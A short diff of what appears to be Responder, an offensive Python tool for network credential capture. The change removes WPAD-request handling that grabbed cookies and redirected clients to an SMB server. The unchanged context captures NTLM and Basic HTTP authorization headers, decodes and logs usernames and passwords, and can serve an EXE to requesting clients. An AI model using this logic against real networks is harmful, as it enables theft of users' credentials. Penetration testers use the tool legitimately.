@@ -949,7 +949,6 @@ Exec_Mode_On_Off
 def PacketSequence(data,client):
     a = re.findall('(?<=Authorization: NTLM )[^\\r]*', data)
     b = re.findall('(?<=Authorization: Basic )[^\\r]*', data)
-    c = re.findall('(?<=wpad.dat )[^\\r]*', data)
     if ServeEXEOrNot(Exe_On_Off) and re.findall('.exe', data):
        payload = ServeEXE(data,client,FILENAME)
        buffer1 = ServerExeFile(Payload = payload,filename=FILENAME)
@@ -984,11 +983,6 @@ def PacketSequence(data,client):
        logging.warning('[+]HTTP-User & Password: %s'%(b64decode(''.join(b))))
        buffer1 = IIS_Auth_Granted()
        buffer1.calculate()
-       return str(buffer1)
-    if c:
-       GrabCookie(data,client)
-       buffer1 = IIS_Auth_Redir()
-       print "HTTP WPAD request detected, redirecting to SMB server"
        return str(buffer1)
 
     else:
@@ -1513,6 +1507,4 @@ if __name__ == '__main__':
     except:
         raise
     raw_input()
-
-
 
